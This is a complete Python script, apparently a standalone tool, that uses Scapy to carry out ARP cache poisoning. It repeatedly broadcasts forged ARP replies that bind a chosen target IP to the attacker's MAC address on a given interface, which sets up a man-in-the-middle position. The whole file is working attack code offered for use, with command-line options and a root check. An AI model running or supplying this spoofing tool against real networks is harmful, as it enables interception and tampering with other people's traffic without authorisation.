#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
	 ARP cache poisoning implementation using Scapy
"""

from scapy.all import *
from time import sleep
from os import geteuid
from sys import argv, exit
from argparse import ArgumentParser

def mitm(interface, target, interval=10):
	"""ARP cache poisoning attack"""

	try:
		myMAC = get_if_hwaddr(interface)
		print("[*] Starting attack ...")
		while 1:
			sendp(Ether(dst="FF:FF:FF:FF:FF:FF")/ARP(op="is-at", psrc=target, hwsrc=myMAC))
			sleep(interval)
	except IOError:
		exit("[!] Interface doesn't exist")
	except KeyboardInterrupt:
		print("\n[*] Stopping attack")

if __name__ == "__main__":
	if not geteuid() == 0:
		exit("[!] You must be root")

	ap = ArgumentParser(description="ARP cache poisoning implementation using Scapy")
	ap.add_argument("-i", "--interface", required = True, help = "network interface")
	ap.add_argument("-t", "--target", required = True, help = "target's IP")
	ap.add_argument("-I", "--interval", type=float, default=10, help = "seconds between two ARP frames (default: 10s)")
	args = vars(ap.parse_args())

	mitm(args["interface"], args["target"], args["interval"])
